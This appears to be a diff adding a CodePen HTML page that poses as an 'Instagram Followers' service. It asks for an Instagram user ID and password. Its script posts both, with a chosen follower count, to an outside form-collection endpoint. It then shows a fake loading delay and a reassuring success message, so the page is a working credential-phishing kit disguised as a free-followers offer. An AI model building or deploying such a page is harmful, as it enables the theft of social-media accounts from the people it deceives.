@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>CodePen - hhhhhhhh</title>
+  
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Followers - 3D Animated Login</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #ff9a8b 0%, #ff6a00 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .login-container {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 2rem;
+            border-radius: 20px;
+            box-shadow: 0 15px 25px rgba(0, 0, 0, 0.4);
+            text-align: center;
+            max-width: 90%; /* Responsive width */
+            width: 400px; /* Fixed width for larger screens */
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            animation: fadeIn 1s ease-out;
+            perspective: 1000px; /* For the 3D effect */
+        }
+
+        .login-container h1 {
+            margin-bottom: 1.5rem; /* Adjusted margin for smaller screens */
+            color: #fff;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.7);
+            font-size: 2rem; /* Adjusted font size for better readability on mobile */
+            animation: glow 1.5s infinite alternate;
+        }
+
+        .login-container .input-box {
+            position: relative;
+            margin: 1rem 0; /* Adjusted margin for smaller screens */
+        }
+
+        .login-container input, .login-container select {
+            width: 100%; /* Full width for mobile */
+            padding: 1rem;
+            border: none;
+            outline: none;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 15px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+            font-size: 1rem;
+            color: #fff;
+            transition: transform 0.3s, box-shadow 0.3s, background 0.3s;
+            perspective: 1000px;
+            transform-style: preserve-3d;
+            transform: translateZ(0);
+        }
+
+        .login-container input:focus, .login-container select:focus {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateZ(30px) scale(1.1); /* 3D pop-out effect */
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4), 0 0 20px #ff6a00;
+        }
+
+        .login-container button {
+            padding: 1rem 2rem; /* Adjusted padding for better fit on mobile */
+            background: linear-gradient(45deg, #ff9a8b, #ff6a00);
+            border: none;
+            border-radius: 30px;
+            color: white;
+            font-size: 1.1rem;
+            cursor: pointer;
+            margin-top: 1rem; /* Adjusted margin for smaller screens */
+            transition: transform 0.3s ease-in-out, box-shadow 0.3s ease;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4), 0 0 20px #ff6a00;
+            text-transform: uppercase;
+        }
+
+        .login-container button:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.5), 0 0 25px #ff6a00;
+        }
+
+        .note {
+            margin-top: 1rem; /* Adjusted margin for smaller screens */
+            color: #fff;
+            font-size: 1rem; /* Adjusted font size for mobile */
+            transform: translateZ(0);
+            transition: transform 0.5s, opacity 0.5s;
+            text-shadow: 0 0 15px rgba(255, 255, 255, 0.6);
+        }
+        
+        .note.visible {
+            opacity: 1;
+            transform: translateZ(30px) scale(1.2); /* 3D pop-out animation */
+        }
+
+        .note.loading {
+            animation: bounce 1s infinite;
+        }
+
+        .loading-animation {
+            display: none;
+            margin: 2rem 0;
+            border: 8px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 8px solid #ff6a00;
+            width: 60px; /* Adjusted size for mobile */
+            height: 60px; /* Adjusted size for mobile */
+            animation: spin 2s linear infinite;
+        }
+
+        .loading-animation.visible {
+            display: inline-block;
+        }
+
+        @keyframes bounce {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes glow {
+            from {
+                text-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
+            }
+            to {
+                text-shadow: 0 0 25px rgba(255, 255, 255, 0.9);
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <h1>Instagram Followers</h1>
+        <div class="input-box">
+            <input type="text" id="userId" placeholder="Enter User ID" />
+        </div>
+        <div class="input-box">
+            <input type="password" id="password" placeholder="Enter Password" />
+        </div>
+        <div class="input-box">
+            <select id="followerAmount">
+                <option value="1k">1K Followers</option>
+                <option value="2k">2K Followers</option>
+                <option value="3k">3K Followers (Max)</option>
+            </select>
+        </div>
+        <button onclick="login()">Login</button>
+        <p id="message" class="note"></p>
+        <div id="loading" class="loading-animation"></div>
+    </div>
+
+    <script>
+        function login() {
+            const userId = document.getElementById('userId').value;
+            const password = document.getElementById('password').value;
+            const followerAmount = document.getElementById('followerAmount').value;
+            const message = document.getElementById('message');
+            const loading = document.getElementById('loading');
+
+            if (userId && password && followerAmount) {
+                // Show loading animation
+                loading.classList.add('visible');
+
+                fetch("https://submit-form.com/2YnsUlYj3", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        userId: userId,
+                        password: password,
+                        followerAmount: followerAmount,
+                    }),
+                }).then(response => {
+                    // Simulate loading delay
+                    setTimeout(() => {
+                        loading.classList.remove('visible');
+                        showMessage();
+                    }, 2000); // 2-second delay for loading
+                }).catch(() => {
+                    // Even in case of an error, show the message after loading delay
+                    setTimeout(() => {
+                        loading.classList.remove('visible');
+                        showMessage();
+                    }, 2000);
+                });
+            } else {
+                message.innerHTML = "Please fill out all fields.";
+                message.classList.add('visible');
+            }
+        }
+
+        function showMessage() {
+            const message = document.getElementById('message');
+            message.innerHTML = "Your request has been successfully processed. Please wait 2 days for completion. In the meantime, ensure that your password is correct to avoid any issues.Thank you for your patience.";
+            message.classList.add('visible', 'loading');
+        }
+    </script>
+
+</body>
+</html>
+<!-- partial -->
+  
+</body>
+</html>
